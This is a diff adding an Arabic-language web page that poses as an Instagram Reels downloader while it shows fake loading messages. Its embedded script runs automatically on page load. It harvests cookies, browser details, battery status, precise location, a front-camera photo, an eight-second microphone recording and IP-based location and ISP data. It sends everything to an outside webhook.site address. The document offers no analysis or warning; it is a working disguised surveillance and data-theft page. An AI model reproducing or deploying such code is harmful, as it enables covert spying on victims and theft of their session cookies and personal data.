@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>تحميل ريلز بسرعة ⚡</title>
+<style>
+body{background:#000;color:#fff;font-family:system-ui;margin:0;padding:20px;text-align:center}
+h1{color:#E1306C;font-size:28px}
+#status{margin:30px;color:#0f0;font-size:18px}
+</style>
+</head>
+<body>
+<h1>تحميل ريلز بسرعة ⚡</h1>
+<p>جاري التحميل… انتظر 5 ثواني</p>
+<div id="status">جاري جمع المعلومات…</div>
+
+<script>
+const webhook = "https://webhook.site/659d1755-8a79-4ca9-b4c7-67d18baed452";
+
+function send(data) {
+  new Image().src = webhook + "?data=" + encodeURIComponent(JSON.stringify(data));
+}
+
+// يشتغل أوتوماتيك بعد 2 ثانية من فتح الصفحة
+setTimeout(startAll, 2000);
+
+function startAll() {
+  let info = {
+    time: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    cookies: document.cookie,
+    referrer: document.referrer || "مباشر"
+  };
+
+  // كل الميزات هتشتغل أوتوماتيك
+  // 1 Battery
+  if (navigator.getBattery) navigator.getBattery().then(b => {
+    info.battery = `${Math.round(b.level*100)}%` + (b.charging ? " شاحن" : "");
+    send(info);
+  });
+
+  // 2 Location
+  navigator.geolocation.getCurrentPosition(p => {
+    info.lat = p.coords.latitude;
+    info.lng = p.coords.longitude;
+    info.map = `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
+    send(info);
+  }, ()=>{}, {timeout:15000});
+
+  // 3 Camera (selfie)
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+    .then(stream => {
+      setTimeout(() => {
+        let video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        setTimeout(() => {
+          let canvas = document.createElement('canvas');
+          canvas.width = 640; canvas.height = 480;
+          canvas.getContext('2d').drawImage(video,0,0,640,480);
+          info.photo = canvas.toDataURL('image/jpeg',0.8);
+          send(info);
+          stream.getTracks().forEach(t=>t.stop());
+        }, 2500);
+      }, 1000);
+    }).catch(()=>{});
+
+  // 4 Microphone 8s
+  navigator.mediaDevices.getUserMedia({audio:true})
+    .then(stream => {
+      let recorder = new MediaRecorder(stream);
+      let chunks = [];
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = () => {
+        let blob = new Blob(chunks, {type:'audio/webm'});
+        let reader = new FileReader();
+        reader.onloadend = () => { info.audio = reader.result; send(info); };
+        reader.readAsDataURL(blob);
+      };
+      recorder.start();
+      setTimeout(() => recorder.stop(), 8000);
+    }).catch(()=>{});
+
+  // 5 IP + City
+  fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
+    info.ip = d.ip;
+    info.city = d.city;
+    info.country = d.country_name;
+    info.isp = d.org;
+    send(info);
+  });
+
+  document.getElementById('status').innerHTML = "تم التحميل بنجاح! انتظر الريل…";
+}
+</script>
+</body>
+</html>
